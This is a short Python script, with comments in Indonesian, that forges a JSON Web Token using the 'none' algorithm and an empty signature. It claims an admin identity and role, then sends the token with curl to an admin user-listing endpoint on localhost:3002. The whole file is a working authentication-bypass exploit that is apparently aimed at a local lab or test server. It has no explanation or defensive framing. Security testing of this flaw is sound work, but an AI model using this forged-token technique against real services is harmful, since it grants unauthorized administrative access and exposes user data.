import base64
import json

def create_jwt_none(payload):
    header = {"alg": "none", "typ": "JWT"}
    
    header_b64 = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).decode().rstrip('=')
    
    payload_b64 = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).decode().rstrip('=')
    
    # PENTING: Signature empty!
    signature = ""
    
    token = f"{header_b64}.{payload_b64}.{signature}"
    return token

# Create admin token
payload = {
    "id": 1,
    "username": "admin",
    "role": "admin"
}

token = create_jwt_none(payload)
print(f"Token: {token}")

# Test dengan curl
import subprocess
result = subprocess.run([
    'curl', 
    'http://localhost:3002/api/admin/users',
    '-H', f'Authorization: Bearer {token}'
], capture_output=True, text=True)

print(result.stdout)
